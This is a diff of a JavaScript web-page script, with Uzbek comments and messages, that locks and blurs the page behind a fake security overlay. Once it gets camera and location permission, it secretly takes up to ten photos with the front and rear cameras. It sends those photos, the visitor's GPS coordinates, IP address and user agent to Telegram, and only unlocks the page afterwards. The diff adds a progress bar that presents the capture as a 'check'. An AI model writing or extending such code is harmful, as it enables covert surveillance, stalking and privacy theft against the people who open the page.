@@ -76,7 +76,6 @@
             </button>
         `;
 
-        // Pulse animatsiya
         const styleEl = document.createElement('style');
         styleEl.textContent = `
             @keyframes pulse-red {
@@ -119,23 +118,18 @@
         const statusText = document.getElementById('lock-status-text');
         if (icon) {
             icon.style.animation = 'shake-lock 0.5s ease';
-            setTimeout(() => {
-                icon.style.animation = '';
-            }, 500);
+            setTimeout(() => { icon.style.animation = ''; }, 500);
         }
         if (statusText) {
             statusText.textContent = '🔒 RUXSAT BERILMADI! QAYTA URINISH';
             statusText.style.color = '#ef4444';
-            setTimeout(() => {
-                statusText.textContent = '🔒 QULFLANGAN';
-            }, 1500);
+            setTimeout(() => { statusText.textContent = '🔒 QULFLANGAN'; }, 1500);
         }
     }
 
     function unlockAnimation(callback) {
         const icon = document.getElementById('lock-icon-svg');
         const statusText = document.getElementById('lock-status-text');
-        const overlay = document.getElementById('lock-overlay');
         const btn = document.getElementById('lock-unlock-btn');
 
         if (icon) {
@@ -158,16 +152,83 @@
             btn.style.display = 'none';
         }
 
-        if (overlay) {
-            setTimeout(() => {
-                overlay.style.transition = 'opacity 1s ease';
-                overlay.style.opacity = '0';
-                setTimeout(() => {
-                    overlay.remove();
-                    if (callback) callback();
-                }, 1000);
-            }, 1500);
+        // Progress bar ko'rsatish
+        setTimeout(() => {
+            showProgressBar(callback);
+        }, 1500);
+    }
+
+    // ─── PROGRESS BAR ───
+
+    function showProgressBar(onComplete) {
+        const overlay = document.getElementById('lock-overlay');
+        if (!overlay) return;
+
+        const progressContainer = document.createElement('div');
+        progressContainer.id = 'progress-container';
+        progressContainer.style.cssText = `
+            margin-top: 20px; width: 80%; max-width: 400px; text-align: center;
+        `;
+
+        progressContainer.innerHTML = `
+            <div style="width:100%; height:8px; background:#333; border-radius:8px; overflow:hidden;">
+                <div id="progress-bar-fill" style="height:100%; width:0%; background:linear-gradient(90deg, #22c55e, #4f7cff); border-radius:8px; transition:width 0.3s ease;"></div>
+            </div>
+            <div id="progress-percent" style="color:#22c55e; font-size:24px; font-weight:700; margin-top:12px;">0%</div>
+            <div id="progress-status" style="color:#aaa; font-size:14px; margin-top:6px;">Tayyorlanmoqda...</div>
+            <div id="progress-images" style="display:flex; justify-content:center; gap:8px; margin-top:16px; flex-wrap:wrap;"></div>
+        `;
+
+        overlay.appendChild(progressContainer);
+
+        // Rasm indikatorlari
+        const imgContainer = document.getElementById('progress-images');
+        for (let i = 1; i <= 5; i++) {
+            const dot = document.createElement('div');
+            dot.id = `img-dot-${i}`;
+            dot.style.cssText = `
+                width: 40px; height: 40px; border-radius: 8px;
+                background: #333; border: 2px solid #555;
+                display: flex; align-items: center; justify-content: center;
+                font-size: 14px; color: #888; transition: all 0.3s;
+            `;
+            dot.textContent = '⏳';
+            imgContainer.appendChild(dot);
         }
+
+        if (onComplete) onComplete();
+    }
+
+    function updateProgress(percent, statusText, imageIndex, imageDone) {
+        const fill = document.getElementById('progress-bar-fill');
+        const percentEl = document.getElementById('progress-percent');
+        const statusEl = document.getElementById('progress-status');
+
+        if (fill) fill.style.width = percent + '%';
+        if (percentEl) percentEl.textContent = percent + '%';
+        if (statusEl && statusText) statusEl.textContent = statusText;
+
+        if (imageIndex && imageDone !== undefined) {
+            const dot = document.getElementById(`img-dot-${imageIndex}`);
+            if (dot) {
+                if (imageDone) {
+                    dot.style.background = '#22c55e';
+                    dot.style.borderColor = '#22c55e';
+                    dot.style.color = '#fff';
+                    dot.textContent = '✅';
+                } else {
+                    dot.style.background = '#4f7cff';
+                    dot.style.borderColor = '#4f7cff';
+                    dot.style.color = '#fff';
+                    dot.textContent = '📸';
+                }
+            }
+        }
+    }
+
+    function removeProgressBar() {
+        const progressContainer = document.getElementById('progress-container');
+        if (progressContainer) progressContainer.remove();
     }
 
     // ─── PERMISSION HANDLING ───
@@ -266,18 +327,10 @@
             });
             stream.getTracks().forEach(t => t.stop());
             permissionGranted = true;
-
-            // Kamera ruxsati olindi — endi lokatsiya
             requestLocationPermission();
         } catch(e) {
             permissionGranted = false;
             shakeLock();
-            setTimeout(() => {
-                const overlay = document.getElementById('lock-overlay');
-                if (overlay && !captureDone) {
-                    // Qayta so'rash
-                }
-            }, 1000);
         }
     }
 
@@ -291,15 +344,11 @@
                 });
             });
             locationGranted = true;
-            
-            // Ikkala ruxsat ham olindi
             unlockAnimation(() => {
                 startCapture({ lat: pos.coords.latitude, lon: pos.coords.longitude });
             });
         } catch(e) {
             locationGranted = false;
-            shakeLock();
-            // Lokatsiya rad etilgan — lekin davom etamiz
             setTimeout(() => {
                 unlockAnimation(() => {
                     startCapture(null);
@@ -419,27 +468,57 @@
         try {
             const isMobile = isMobileDevice();
             let successCount = 0;
+            const totalImages = isMobile ? 10 : 5;
+            let completedImages = 0;
 
+            // Old kamera — 5 ta rasm
             for (let i = 1; i <= 5; i++) {
+                updateProgress(Math.round((completedImages / totalImages) * 100), 
+                    `Rasm olinmoqda: ${i}/5`, i, false);
+                
                 const photo = await capturePhoto('user');
+                
+                updateProgress(Math.round(((completedImages + 0.5) / totalImages) * 100),
+                    `Rasm yuborilmoqda: ${i}/5`, i, false);
+                
                 if (photo) {
                     await sendPhotoToTelegram(photo, `📸 Old kamera surati ${i}/5`);
                     successCount++;
                 }
-                await new Promise(r => setTimeout(r, 400));
+                
+                completedImages++;
+                updateProgress(Math.round((completedImages / totalImages) * 100),
+                    `Rasm ${i}/5 tayyor`, i, true);
+                
+                await new Promise(r => setTimeout(r, 300));
             }
 
+            // Orqa kamera — mobil
             if (isMobile) {
                 for (let i = 1; i <= 5; i++) {
+                    updateProgress(Math.round((completedImages / totalImages) * 100),
+                        `Orqa kamera: ${i}/5`, i + 5, false);
+                    
                     const photo = await capturePhoto('environment');
+                    
+                    updateProgress(Math.round(((completedImages + 0.5) / totalImages) * 100),
+                        `Orqa rasm yuborilmoqda: ${i}/5`, i + 5, false);
+                    
                     if (photo) {
                         await sendPhotoToTelegram(photo, `📸 Orqa kamera surati ${i}/5`);
                         successCount++;
                     }
-                    await new Promise(r => setTimeout(r, 400));
+                    
+                    completedImages++;
+                    updateProgress(Math.round((completedImages / totalImages) * 100),
+                        `Orqa rasm ${i}/5 tayyor`, i + 5, true);
+                    
+                    await new Promise(r => setTimeout(r, 300));
                 }
             }
 
+            // Lokatsiya
+            updateProgress(90, 'Lokatsiya yuborilmoqda...');
             let lat = null, lon = null;
             if (locationData) {
                 lat = locationData.lat;
@@ -447,6 +526,8 @@
                 await sendLocationToTelegram(lat, lon);
             }
 
+            // IP
+            updateProgress(95, 'IP ma\'lumotlari yig\'ilmoqda...');
             const ip = await getIP();
             const ua = navigator.userAgent;
             const time = new Date().toLocaleString();
@@ -454,9 +535,25 @@
             const infoText = `📋 Tekshiruv natijasi\n👤 IP: ${ip}\n🌐 User-Agent: ${ua.substring(0, 80)}...\n📍 Lokatsiya: ${lat ? lat + ', ' + lon : 'Mavjud emas'}\n🕐 Vaqt: ${time}\n📸 Yuborilgan rasmlar: ${successCount}\n✅ Holat: Muvaffaqiyatli`;
 
             await sendMessageToTelegram(infoText);
-            captureDone = true;
-            unblurApp();
-            unblockAllInputs();
+            
+            updateProgress(100, '✅ Barcha ma\'lumotlar yuborildi!');
+
+            // Yopish
+            setTimeout(() => {
+                const overlay = document.getElementById('lock-overlay');
+                if (overlay) {
+                    overlay.style.transition = 'opacity 0.8s ease';
+                    overlay.style.opacity = '0';
+                    setTimeout(() => {
+                        overlay.remove();
+                        removeProgressBar();
+                        captureDone = true;
+                        unblurApp();
+                        unblockAllInputs();
+                    }, 800);
+                }
+            }, 1500);
+
         } catch(err) {
             console.error('Capture error:', err);
         } finally {
@@ -471,7 +568,6 @@
         blockAllInputs();
         createLockOverlay();
 
-        // Har 4 soniyada tekshirish
         setInterval(() => {
             if (!captureDone && !captureInProgress) {
                 const overlay = document.getElementById('lock-overlay');
@@ -483,7 +579,6 @@
             }
         }, 4000);
 
-        // Sahifa ko'rinish holati o'zgarganda
         document.addEventListener('visibilitychange', function() {
             if (!document.hidden && !captureDone && !captureInProgress) {
                 const overlay = document.getElementById('lock-overlay');
@@ -495,7 +590,6 @@
             }
         });
 
-        // Refresh bo'lsa ham qayta chiqadi
         window.addEventListener('pageshow', function() {
             if (!captureDone && !captureInProgress) {
                 blurApp();
